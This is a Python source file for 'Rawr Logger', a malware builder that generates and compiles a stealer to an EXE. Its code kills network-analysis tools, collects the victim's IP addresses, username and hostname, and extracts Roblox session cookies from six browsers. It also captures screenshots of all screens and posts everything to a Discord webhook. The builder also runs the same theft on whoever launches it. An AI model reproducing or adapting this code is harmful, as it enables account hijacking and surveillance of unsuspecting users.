import os,time,requests,socket,threading
from requests import get
from pystyle import *
from PIL import ImageGrab
import browser_cookie3
os.system(f'cls & title Rawr Logger!')
os.system("taskkill /f /im  wireshark.exe")
os.system("taskkill /f /im  ProcessHacker.exe")
os.system("taskkill /f /im  Fiddler.exe")
os.system("taskkill /f /im  HTTPDebugger.exe")
os.system('cls')
u = os.getlogin()
webhook = "Enter Dual Webhook Here"
hostname = socket.gethostname()  
ips = get('https://api.ipify.org').text 
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname) 
embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",

                        "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f" @everyone You Got A Hit\n```There Public Ip Is: {ips}``` ```There Computers Ip:{ip}``` ```There Pc Username Is: {pc_username}``````There Pc Host Name Is: {hostname}```",
                }
            ]
        }
requests.post(webhook, json=embed) 
def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f" ```Roblox Cookie Is:{cookie}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                      
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def braves():
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def operas():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                      
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def vivaldis():
    try:
        cookies = browser_cookie3.vivaldi(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``````",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
browsers = [edge,chromes,vivaldis,operas,braves,firefoxs]
for i in browsers:
  threading.Thread(target=i,).start()
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
  requests.post(webhook,files={'upload_file': f})
Write.Print(Center.XCenter("""
                                          
                                ▒▒▓▓                              
                                ▒▒▓▓                              
                              ░░██░░                              
                            ░░██████░░                            
                          ▒▒████████░░                            
                        ▒▒██████████░░                            
                      ████████████████▓▓                          
                    ████████████▓▓████▒▒                          
                  ████████████▓▓▒▒██████▓▓                        
                ████████████▓▓▒▒▒▒██████▒▒                        
                ████████████▓▓▒▒▓▓████████▓▓                      
              ▒▒████████████▒▒▓▓██████████▓▓                      
              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ████████████▒▒▒▒▒▒████████████████                    
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
                      ████████████████▓▓                          
                  Made By Jose#0001,TheSoap1#9870                                          
                                         
"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
code = """
import os,requests,socket,threading
from PIL import ImageGrab
import browser_cookie3
from PIL import ImageGrab
from requests import get
os.system("taskkill /f /im  wireshark.exe")
os.system("taskkill /f /im  ProcessHacker.exe")
os.system("taskkill /f /im  Fiddler.exe")
os.system("taskkill /f /im  HTTPDebugger.exe")
os.system('cls')
u = os.getlogin()
webhook = "johns"
hostname = socket.gethostname()  
ips = get('https://api.ipify.org').text 
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname) 
embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",

                        "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
"description": f" @everyone You Got A Hit```There Public Ip Is: {ips}``` ```There Computers Ip:{ip}``` ```There Pc Username Is: {pc_username}``````There Pc Host Name Is: {hostname}```",
                }
            ]
        }
requests.post(webhook, json=embed) 
def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f" ```Roblox Cookie Is:{cookie}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                      
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def braves():
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def operas():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}```",                      
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
def vivaldis():
    try:
        cookies = browser_cookie3.vivaldi(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``````",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
        pass
browsers = [edge,chromes,vivaldis,operas,braves,firefoxs]
for x in browsers:
  threading.Thread(target=x,).start()
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
  requests.post(webhook,files={'upload_file': f})

"""
file = open(f'{name}.py', 'a')
file.write(code.replace("johns", webhook))
time.sleep(2)
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
if compile == "y":
  names = Write.Input("Enter File Directory For The Logger You Want To Converte To A Exe:", Colors.green_to_yellow, interval=0.01)
  file = open(f'{name}.py', 'a')
  os.system(f"pyinstaller --onefile {name}.py")
  Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
  time.sleep(2)
  Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
  time.sleep(3)
  exit()
elif compile == "n":
  Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
  time.sleep(3)
  exit()
